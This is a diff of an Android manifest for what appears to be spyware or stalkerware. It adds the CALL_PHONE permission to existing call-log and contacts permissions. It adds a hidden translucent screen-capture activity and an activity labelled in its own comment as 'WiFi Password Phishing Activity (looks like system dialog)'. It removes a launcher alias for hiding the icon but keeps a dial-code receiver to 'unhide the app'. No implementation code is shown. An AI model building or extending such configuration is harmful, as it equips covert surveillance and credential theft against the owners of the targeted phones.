@@ -45,6 +45,7 @@
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
     
     <!-- Contacts Permissions -->
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -95,15 +96,12 @@
         android:fullBackupContent="true"
         android:dataExtractionRules="@xml/data_extraction_rules">
         
-        <!-- Main Activity with stealth options -->
+        <!-- Main Activity -->
         <activity 
             android:name=".MainActivity" 
-            android:launchMode="singleInstance"
+            android:launchMode="singleTask"
             android:exported="true"
             android:screenOrientation="portrait"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:taskAffinity=""
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/SplashTheme">
             <intent-filter>
@@ -112,19 +110,25 @@
             </intent-filter>
         </activity>
         
-        <!-- Launcher Alias (can be enabled/disabled to show/hide icon) -->
-        <activity-alias
-            android:name=".LauncherAlias"
-            android:targetActivity=".MainActivity"
-            android:enabled="true"
-            android:exported="true"
-            android:icon="@mipmap/ic_launcher"
-            android:label="@string/app_name">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
-            </intent-filter>
-        </activity-alias>
+        <!-- Screen Capture Permission Activity (transparent) -->
+        <activity
+            android:name=".ScreenCaptureActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleTask"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            />
+            
+        <!-- WiFi Password Phishing Activity (looks like system dialog) -->
+        <activity
+            android:name=".WiFiPasswordActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleTask"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            />
         
         <!-- Dial code receiver to unhide the app -->
         <receiver
